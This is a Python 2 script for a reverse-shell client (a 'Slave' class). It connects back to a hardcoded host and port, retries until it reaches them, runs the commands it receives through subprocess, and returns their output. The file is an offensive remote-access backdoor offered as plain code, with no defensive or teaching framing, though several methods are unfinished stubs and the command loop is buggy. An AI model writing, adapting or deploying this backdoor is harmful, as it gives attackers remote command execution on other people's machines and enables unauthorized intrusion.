#######################################
from time import sleep
import socket,subprocess,os
import sys
#######################################
ip="127.0.0.1"
port=4444
#######################################
def string(lst):
	s=""
	for i in lst:
		s+=str(i)
	return s
#######################################
class Slave:
	def __init__(self,ip,port):
		self.ip=ip
		self.port=port
	def connect(self):
		self.connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		while True:
			try:
				self.connection.connect((self.ip,self.port))
				break
			except socket.error:
				sleep(5)
		self.main()
	def main(self):
		try:
			resp=self.connection.recv(1024)
			resp_ret=self.execute(resp)
			self.connection.send(resp_ret)
			print "executed "+string(resp)+" and responsed with \n"+string(resp_ret)
			return True
		except:
			print "exception"
			return self.close()
	def execute(self,resp):
		if resp=="exit":
			self.connection.close()
			sys.exit()
		if resp=="close":
			self.close()
		resp=resp.split(' ')
		if resp[0]=='cd':
			try:
				os.chdir(resp[1])
			except:
				resp_ret="Error changing path to "+str(resp[1])
		else:
			try:
				resp_ret=subprocess.check_output(resp)
			except:
				resp_ret="Error processing command "+str(resp)
		return resp_ret
	def close(self):
		self.connection.close()
		return False
	def check_connection(self):
		#TODO
		pass
	def packinput(self):
		#TODO
		pass
	def packoutput(self):
		#TODO
		pass
#######################################
slav=Slave(ip,port)
while True:
	slav.connect()
	while True:
		if not slav.main():
			slav=Slave(ip,port)
			break
